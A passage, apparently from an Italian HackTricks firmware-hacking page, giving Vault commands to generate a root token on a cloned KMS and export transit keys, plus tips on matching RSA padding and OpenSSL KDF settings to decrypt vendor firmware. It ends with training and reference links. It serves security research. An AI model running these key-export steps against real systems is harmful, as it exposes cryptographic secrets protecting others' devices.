FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root sul KMS clonato:

- Rendi esportabili le chiavi transit solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata con la coppia esatta di padding/hash usata dal KMS. Un tentativo di decrittazione PKCS#1 v1.5 non riuscito e un tentativo di decrittazione OAEP predefinito non riuscito **non** dimostrano che la chiave sia errata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie più comuni usano SHA-1 per impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente il KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 negli appliance legacy) prima di tentare la decrittazione AES-CBC.

Questo trasforma il problema del "firmware crittografato" in un problema più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline i parametri esatti di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craccare il firmware con Claude: competenze di livello senior, autonomia di livello junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva agli attacchi all'Internet delle cose](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day nell'hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dalla porta di ricarica - Parte 2: aggirare l'anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: sfruttamento via OTA del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
